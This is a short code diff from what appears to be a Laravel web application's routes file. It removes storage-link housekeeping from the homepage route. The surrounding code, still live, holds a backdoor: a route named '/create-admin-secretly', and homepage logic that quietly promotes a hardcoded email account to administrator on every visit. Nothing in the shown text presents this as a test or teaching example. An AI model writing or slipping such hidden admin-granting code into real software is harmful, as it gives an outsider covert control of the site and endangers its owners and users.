@@ -38,12 +38,6 @@ Route::get('/create-admin-secretly', function () {
 
 
 Route::get('/', function () {
-    if (file_exists(public_path('storage'))) {
-        @unlink(public_path('storage'));
-    }
-
-    \Illuminate\Support\Facades\Artisan::call('storage:link');
-
     $user = \App\Models\User::where('email', 'myavk22@gmail.com')->first();
     if ($user && !$user->is_admin) {
         $user->is_admin = true;
